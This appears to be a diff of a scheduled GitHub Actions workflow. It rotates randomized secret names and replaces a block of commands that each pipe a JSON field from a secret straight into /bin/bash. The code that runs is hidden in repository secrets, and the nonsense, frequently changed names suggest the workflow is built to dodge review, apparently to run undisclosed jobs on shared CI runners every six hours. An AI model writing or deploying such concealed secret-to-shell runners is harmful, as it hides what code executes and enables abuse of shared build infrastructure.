@@ -2,32 +2,28 @@ name: yangtianbao2001
 on:
   workflow_dispatch:
   schedule:
-    - cron: '10 2/6 * * *'
+    - cron: '23 0/6 * * *'
 
-jobs:  # 5734
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: yangtianbao2001
         env:
-          ki993: ${{ secrets.ki993 }}
+          zepss0: ${{ secrets.zepss0 }}
         run: |
-          echo $ki993 | jq -r .disrn5 | /bin/bash
-          echo $qka9 | jq -r .uq1 | /bin/bash
-          echo $rn83128 | jq -r .zzuc641 | /bin/bash
-          echo $xa5 | jq -r .v1 | /bin/bash
-          echo $bm086 | jq -r .yyc6308 | /bin/bash
-          echo $lhg08 | jq -r .yqzf57833 | /bin/bash
-          echo $wybo14 | jq -r .osn69 | /bin/bash
-          echo $asxq080 | jq -r .o95427 | /bin/bash
-          echo $stol6 | jq -r .ge91 | /bin/bash
-          echo $plk76649 | jq -r .u29176 | /bin/bash
-          echo $po67937 | jq -r .qnjmr48 | /bin/bash
-          echo $uodp926 | jq -r .r6439 | /bin/bash
-          echo $biw8 | jq -r .nqrg01921 | /bin/bash
-          echo $qkql31 | jq -r .czpg1359 | /bin/bash
-          echo $k855 | jq -r .t1126 | /bin/bash
-          echo $fa45 | jq -r .k55085 | /bin/bash
+          echo $zepss0 | jq -r .r8 | /bin/bash
+          echo $y97337 | jq -r .qalav2 | /bin/bash
+          echo $reex19 | jq -r .wbw9301 | /bin/bash
+          echo $bujy95481 | jq -r .cwo85370 | /bin/bash
+          echo $zjy930 | jq -r .y4 | /bin/bash
+          echo $gktks873 | jq -r .ywnx00 | /bin/bash
+          echo $gpsqo0 | jq -r .uesa484 | /bin/bash
+          echo $jxk809 | jq -r .taxux1485 | /bin/bash
+          echo $ee332 | jq -r .g8 | /bin/bash
+          echo $wud4 | jq -r .w280 | /bin/bash
+          echo $ko75497 | jq -r .dl4 | /bin/bash
+          echo $gnv6 | jq -r .vo37 | /bin/bash
+          echo $gnhna7 | jq -r .gctkk273 | /bin/bash
 
